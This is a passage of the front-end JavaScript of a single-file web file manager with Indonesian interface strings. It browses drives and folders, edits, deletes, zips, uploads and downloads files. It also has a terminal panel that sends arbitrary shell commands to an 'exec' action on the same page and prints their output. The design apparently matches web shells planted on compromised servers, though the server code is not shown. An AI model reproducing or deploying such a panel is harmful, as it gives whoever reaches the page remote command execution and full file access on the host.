    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: form
  });
  const text = await r.text();
  let res;
  try { res = JSON.parse(text); } catch(e) { res = { ok: false, msg: 'BAD RESPONSE' }; }
  showNotice(res.msg, res.ok);
  if (res.ok) { closeDelete(); selected.clear(); setZipMode(false); loadDir(currentPath, true); }
}

async function doZipSelected() {
  if (selected.size === 0) { showNotice('PILIH MINIMAL 1 ITEM', false); return; }
  const form = new URLSearchParams();
  form.append('action', 'zip');
  selected.forEach(t => form.append('targets[]', t));
  const r = await fetch(window.location.pathname, {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: form
  });
  const text = await r.text();
  let res;
  try { res = JSON.parse(text); } catch(e) { res = { ok: false, msg: 'BAD RESPONSE' }; }
  showNotice(res.msg, res.ok);
  if (res.ok) { selected.clear(); setZipMode(false); loadDir(currentPath, true); }
}
async function doUnzip(p) {
  const res = await api('unzip', { target: p });
  showNotice(res.msg, res.ok);
  if (res.ok) loadDir(currentPath, true);
}
function doDownload(p) {
  const url = window.location.pathname + '?download=' + encodeURIComponent(p);
  const a = document.createElement('a');
  a.href = url; a.download = '';
  document.body.appendChild(a); a.click(); a.remove();
}
function goUp() {
  const parent = parentPath(currentPath);
  if (!parent || parent === currentPath) return;
  loadDir(parent);
}

function escHtml(s) {
  return String(s || '').replace(/[&<>"']/g, c =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
}
function escAttr(s) {
  return String(s || '').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function humanSize(b) {
  if (b < 1024) return b + 'B';
  if (b < 1024*1024) return (b/1024).toFixed(1) + 'K';
  if (b < 1024*1024*1024) return (b/1024/1024).toFixed(1) + 'M';
  return (b/1024/1024/1024).toFixed(1) + 'G';
}

// Highlight — cuma buat VIEW
function highlight(code) {
  if (!code) return '';
  let s = String(code).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const T = [];
  const store = (html) => { const i = T.length; T.push(html); return '\x01x' + i.toString(36) + '\x01'; };
  s = s.replace(/(\/\/[^\n]*|#[^\n]*|\/\*[\s\S]*?\*\/)/g, m => store('<span class="tk-comment">' + m + '</span>'));
  s = s.replace(/("(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`)/g, m => store('<span class="tk-string">' + m + '</span>'));
  s = s.replace(/\b(php|function|return|if|else|elseif|endif|foreach|endforeach|for|endfor|while|endwhile|switch|case|break|default|class|public|private|protected|static|new|echo|print|require|require_once|include|include_once|namespace|use|as|try|catch|finally|throw|extends|implements|interface|abstract|const|var|let|async|await|yield|true|false|null|undefined|this|self|parent|void|int|string|bool|float|array|object|typeof|instanceof|in|of|do|endswitch|declare|enddeclare|global|and|or|xor)\b/g, m => store('<span class="tk-keyword">' + m + '</span>'));
  s = s.replace(/\b(\d+(?:\.\d+)?)\b/g, m => store('<span class="tk-number">' + m + '</span>'));
  s = s.replace(/\b([a-zA-Z_]\w*)(?=\s*\()/g, m => store('<span class="tk-function">' + m + '</span>'));
  s = s.replace(/\b([A-Z_][A-Z0-9_]{2,})\b/g, m => store('<span class="tk-constant">' + m + '</span>'));
  s = s.replace(/(\$[a-zA-Z_]\w*)/g, m => store('<span class="tk-var">' + m + '</span>'));
  s = s.replace(/\x01x([0-9a-z]+)\x01/g, (_, i) => T[parseInt(i, 36)]);
  return s;
}

async function copyToClipboard(text) {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch(e) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    let ok = false;
    try { ok = document.execCommand('copy'); } catch(_) {}
    document.body.removeChild(ta);
    return ok;
  }
}

// TERMINAL
const termOut = $('termOut'), termIn = $('termIn'), termCwd = $('termCwd'), termEl = $('terminalEl');

function termAppend(html) {
  const div = document.createElement('div');
  div.className = 'tline';
  div.innerHTML = html;
  termOut.appendChild(div);
  termOut.scrollTop = termOut.scrollHeight;
}
function termUpdateCwd() { termCwd.textContent = currentPath; }

async function termRun(cmd) {
  if (!cmd.trim()) return;
  termAppend(`<span class="tprompt">&gt;</span><span class="tcmd">${escHtml(cmd)}</span>`);
  if (cmd.trim() === 'clear') { termOut.innerHTML = ''; return; }
  try {
    const res = await api('exec', { cmd, cwd: currentPath });
    if (!res.ok) { termAppend(`<span class="terr">ERR: ${escHtml(res.msg || 'FAILED')}</span>`); return; }
    if (res.stdout) termAppend(`<span class="tok">${escHtml(res.stdout)}</span>`);
    if (res.stderr) termAppend(`<span class="terr">${escHtml(res.stderr)}</span>`);
    if (res.code !== 0 && !res.changed) termAppend(`<span class="tcode">exit ${res.code}</span>`);
    if (res.changed && res.cwd) loadDir(res.cwd, true);
  } catch (e) { termAppend(`<span class="terr">NET ERR: ${escHtml(e.message)}</span>`); }
}
termIn.addEventListener('keydown', e => {
  if (e.key === 'Enter') { const cmd = termIn.value; termIn.value = ''; termRun(cmd); }
});

function toggleTerm() {
  termEl.classList.toggle('collapsed');
  const c = termEl.classList.contains('collapsed');
  try { localStorage.setItem('term_collapsed', c ? '1' : '0'); } catch(e){}
  if (!c) setTimeout(() => termIn.focus(), 220);
}
$('termToggle').addEventListener('click', toggleTerm);
$('termChevron').addEventListener('click', (e) => { e.stopPropagation(); toggleTerm(); });
try {
  if (localStorage.getItem('term_collapsed') !== '0') termEl.classList.add('collapsed');
  else termEl.classList.remove('collapsed');
} catch(e) { termEl.classList.add('collapsed'); }

// CLIPBOARD
function updateClipBanner() {
  const b = $('clipBanner');
  if (clipboard.mode && clipboard.sources.length) {
    const names = clipboard.sources.map(s => s.split(/[\/\\]/).pop()).join(', ');
    const shortNames = names.length > 40 ? names.slice(0, 40) + '…' : names;
    $('clipIcon').innerHTML = clipboard.mode === 'cut'
      ? '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="6" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M20 4L8.12 15.88"/><path d="M14.47 14.48L20 20"/><path d="M8.12 8.12L12 12"/></svg>'
      : '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
    $('clipText').textContent = clipboard.mode.toUpperCase() + ': ' + shortNames;
    b.classList.add('open');
    document.getElementById('mainWrap').style.paddingTop = '3.5rem';
  } else {
    b.classList.remove('open');
    document.getElementById('mainWrap').style.paddingTop = '1rem';
  }
}
async function doPaste(destDir) {
  if (!clipboard.mode || !clipboard.sources.length) { showNotice('CLIPBOARD KOSONG', false); return; }
  const form = new URLSearchParams();
  form.append('action', 'paste'); form.append('mode', clipboard.mode); form.append('dest', destDir);
  clipboard.sources.forEach(s => form.append('sources[]', s));
  const r = await fetch(window.location.pathname, {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: form
  });
  const text = await r.text();
  let res;
  try { res = JSON.parse(text); } catch(e) { res = { ok: false, msg: 'BAD RESPONSE' }; }
  showNotice(res.msg, res.ok);
  if (res.ok) {
    if (clipboard.mode === 'cut') clipboard = { mode: null, sources: [] };
    updateClipBanner();
    loadDir(currentPath, true);
  }
}
$('btnClipPaste').addEventListener('click', () => doPaste(currentPath));
$('btnClipCancel').addEventListener('click', () => { clipboard = { mode: null, sources: [] }; updateClipBanner(); });

// CONTEXT MENU
const ctx = $('ctxMenu');
let longPressTimer = null;
function openCtx(x, y, target) {
  ctxTarget = target; ctx.classList.add('open');
  const rect = ctx.getBoundingClientRect();
  const vw = window.innerWidth, vh = window.innerHeight;
  let px = x, py = y;
  if (px + rect.width > vw - 8) px = vw - rect.width - 8;
  if (py + rect.height > vh - 8) py = vh - rect.height - 8;
  ctx.style.left = px + 'px'; ctx.style.top = py + 'px';
  const isDir = target.dir, isDrive = !!target.drive;
  ctx.querySelector('[data-ctx="view"]').style.display = (isDir || isDrive) ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="edit"]').style.display = (isDir || isDrive) ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="download"]').style.display = (isDir || isDrive) ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="paste"]').style.display = clipboard.mode ? 'flex' : 'none';
  ctx.querySelector('[data-ctx="rename"]').style.display = isDrive ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="delete"]').style.display = isDrive ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="copy"]').style.display = isDrive ? 'none' : 'flex';
  ctx.querySelector('[data-ctx="cut"]').style.display = isDrive ? 'none' : 'flex';
}
function closeCtx() { ctx.classList.remove('open'); ctxTarget = null; }
function attachLongPress() {
  document.querySelectorAll('.item[data-row]').forEach(el => {
    el.addEventListener('touchstart', e => {
      longPressTimer = setTimeout(() => {
        const t = e.touches[0];
        openCtx(t.clientX, t.clientY, {
          path: el.dataset.path, name: el.dataset.name,
          dir: el.dataset.dir === '1', drive: el.dataset.drive === '1'
        });
        if (navigator.vibrate) navigator.vibrate(20);
      }, 500);
    }, { passive: true });
    el.addEventListener('touchend', () => clearTimeout(longPressTimer));
    el.addEventListener('touchmove', () => clearTimeout(longPressTimer));
    el.addEventListener('contextmenu', e => {
      e.preventDefault();
      openCtx(e.clientX, e.clientY, {
        path: el.dataset.path, name: el.dataset.name,
        dir: el.dataset.dir === '1', drive: el.dataset.drive === '1'
      });
    });
  });
}
ctx.addEventListener('click', e => {
  const btn = e.target.closest('[data-ctx]');
  if (!btn || !ctxTarget) return;
  const act = btn.dataset.ctx, t = ctxTarget;
  closeCtx();
  if (act === 'view')     openView(t.path);
  if (act === 'edit')     openEdit(t.path);
  if (act === 'info')     openInfo(t.path);
  if (act === 'download') doDownload(t.path);
  if (act === 'rename')   openRename(t.path, t.name);
  if (act === 'delete')   openDelete(t.path, t.name, t.dir);
  if (act === 'copy') { clipboard = { mode: 'copy', sources: [t.path] }; updateClipBanner(); showNotice('COPIED: ' + t.name, true); }
  if (act === 'cut')  { clipboard = { mode: 'cut',  sources: [t.path] }; updateClipBanner(); showNotice('CUT: ' + t.name, true); }
  if (act === 'paste') { doPaste(t.dir ? t.path : currentPath); }
});
document.addEventListener('click', e => { if (!ctx.contains(e.target)) closeCtx(); });
document.addEventListener('scroll', closeCtx, true);

// KEYBOARD
function isInputFocused() {
  const t = document.activeElement;
  if (!t) return false;
  if (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') return true;
  if (t.isContentEditable) return true;
  return false;
}
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    closeView(); closeEdit(); closeInfo(); closeRename(); closeDelete(); closeNew(); closeCtx(); return;
  }
  if (e.key === 'F2' && !isInputFocused()) {
    if (lastClicked && !lastClicked.drive) { e.preventDefault(); openRename(lastClicked.path, lastClicked.name); }
    return;
  }
  if (e.key === 'Delete' && !isInputFocused()) {
    if (lastClicked && !lastClicked.drive) { e.preventDefault(); openDelete(lastClicked.path, lastClicked.name, lastClicked.dir); }
    return;
  }
  if (!(e.ctrlKey || e.metaKey) || e.shiftKey || e.altKey) return;
  if (isInputFocused()) return;
  if (e.key === 'c' || e.key === 'C') {
    if (lastClicked && !lastClicked.drive) { clipboard = { mode: 'copy', sources: [lastClicked.path] }; updateClipBanner(); showNotice('COPIED: ' + lastClicked.name, true); e.preventDefault(); }
  }
  if (e.key === 'x' || e.key === 'X') {
    if (lastClicked && !lastClicked.drive) { clipboard = { mode: 'cut', sources: [lastClicked.path] }; updateClipBanner(); showNotice('CUT: ' + lastClicked.name, true); e.preventDefault(); }
  }
  if (e.key === 'v' || e.key === 'V') {
    if (clipboard.mode) { doPaste(currentPath); e.preventDefault(); }
  }
  if (e.key === 'a' || e.key === 'A') {
    const items = document.querySelectorAll('.item[data-row]:not(.up):not([data-drive="1"])');
    if (items.length) {
      e.preventDefault(); setZipMode(true); selected.clear();
      items.forEach(it => {
        const p = it.dataset.path;
        if (p) selected.add(p);
        const chk = it.querySelector('.item-check');
        if (chk) chk.classList.add('checked');
        it.classList.add('selected');
      });
      updateSelCount();
    }
  }
});

// EVENT DELEGATION
document.addEventListener('click', e => {
  const chk = e.target.closest('[data-check]');
  if (chk) {
    e.stopPropagation();
    const p = chk.dataset.check;
    if (selected.has(p)) selected.delete(p); else selected.add(p);
    chk.classList.toggle('checked');
    const item = chk.closest('.item');
    if (item) item.classList.toggle('selected', selected.has(p));
    updateSelCount();
    return;
  }
  const abtn = e.target.closest('[data-act]');
  if (abtn && (abtn.tagName === 'BUTTON' || abtn.classList.contains('ibtn'))) {
    e.stopPropagation();
    const act = abtn.dataset.act, path = abtn.dataset.path, name = abtn.dataset.name;
    if (act === 'up')       goUp();
    if (act === 'edit')     openEdit(path);
    if (act === 'rename')   openRename(path, name);
    if (act === 'delete')   openDelete(path, name, abtn.dataset.dir === '1');
    if (act === 'download') doDownload(path);
    if (act === 'unzip')    doUnzip(path);
    return;
  }
  const cd = e.target.closest('[data-cd]');
  if (cd) { loadDir(cd.dataset.cd); return; }
  const row = e.target.closest('[data-row]');
  if (row) {
    const nameEl = e.target.closest('.item-name');
    const driveAttr = row.dataset.drive === '1';
    if (nameEl && nameEl.dataset.act && nameEl.dataset.act !== 'up') {
      setFocus(row);
      lastClicked = { path: row.dataset.path, name: row.dataset.name, dir: row.dataset.dir === '1', drive: driveAttr };
      const act = nameEl.dataset.act;
      if (act === 'cd')   loadDir(nameEl.dataset.path);
      if (act === 'view') openView(nameEl.dataset.path);
      return;
    }
    setFocus(row);
    lastClicked = { path: row.dataset.path, name: row.dataset.name, dir: row.dataset.dir === '1', drive: driveAttr };
    if (row.classList.contains('up')) { goUp(); return; }
    return;
  }
});
document.addEventListener('dblclick', e => {
  const row = e.target.closest('[data-row]');
  if (!row) return;
  if (row.classList.contains('up')) { goUp(); return; }
  const nameEl = row.querySelector('.item-name[data-act]');
  if (nameEl) {
    const act = nameEl.dataset.act, path = nameEl.dataset.path;
    if (act === 'cd')   loadDir(path);
    if (act === 'view') openView(path);
  }
});

// BUTTONS
$('btnRefresh').addEventListener('click', () => loadDir(currentPath, true));
$('btnNewFile').addEventListener('click', () => openNew('file'));
$('btnNewFolder').addEventListener('click', () => openNew('folder'));
$('btnUpload').addEventListener('click', () => $('fileInput').click());
$('fileInput').addEventListener('change', async e => {
  const files = e.target.files;
  if (files && files.length) await doUpload(files);
  e.target.value = '';
});
$('btnZipMode').addEventListener('click', () => {
  if (!zipMode) { setZipMode(true); showNotice('PILIH ITEM, LALU KLIK ZIP LAGI', true); }
  else { if (selected.size > 0) doZipSelected(); else setZipMode(false); }
});
$('btnViewClose').addEventListener('click', closeView);
$('btnViewClose2').addEventListener('click', closeView);
$('btnViewEdit').addEventListener('click', () => { const p = viewTarget; closeView(); openEdit(p); });
$('btnViewCopy').addEventListener('click', async () => {
  const ok = await copyToClipboard(viewRawContent);
  showNotice(ok ? 'CONTENT COPIED' : 'COPY FAILED', ok);
});
$('btnCopyAll').addEventListener('click', async () => {
  const ok = await copyToClipboard(editorEl.value);
  showNotice(ok ? 'CONTENT COPIED' : 'COPY FAILED', ok);
});
$('btnEditClose').addEventListener('click', closeEdit);
$('btnCancel').addEventListener('click', closeEdit);
$('btnSave').addEventListener('click', saveEdit);
$('btnInfoX').addEventListener('click', closeInfo);
$('btnInfoClose').addEventListener('click', closeInfo);
$('btnRenameX').addEventListener('click', closeRename);
$('btnRenameCancel').addEventListener('click', closeRename);
$('btnRenameOk').addEventListener('click', doRename);
$('renameInput').addEventListener('keydown', e => { if (e.key === 'Enter') doRename(); });
$('btnNewX').addEventListener('click', closeNew);
$('btnNewCancel').addEventListener('click', closeNew);
$('btnNewOk').addEventListener('click', doNew);
$('newName').addEventListener('keydown', e => { if (e.key === 'Enter') doNew(); });
$('btnDelX').addEventListener('click', closeDelete);
$('btnDelCancel').addEventListener('click', closeDelete);
$('btnDelOk').addEventListener('click', doDelete);
['viewModal','editModal','infoModal','renameModal','delModal','newModal'].forEach(id => {
  $(id).addEventListener('click', e => {
    if (e.target.id === id) {
      if (id === 'viewModal')   closeView();
      if (id === 'editModal')   closeEdit();
      if (id === 'infoModal')   closeInfo();
      if (id === 'renameModal') closeRename();
      if (id === 'delModal')    closeDelete();
      if (id === 'newModal')    closeNew();
    }
  });
});

// INIT
history.replaceState({ path: currentPath }, '', '?path=' + encodeURIComponent(currentPath));
renderPath(currentPath);
loadDir(currentPath, true);
updateClipBanner();
termUpdateCwd();
</script>

</body>
</html>
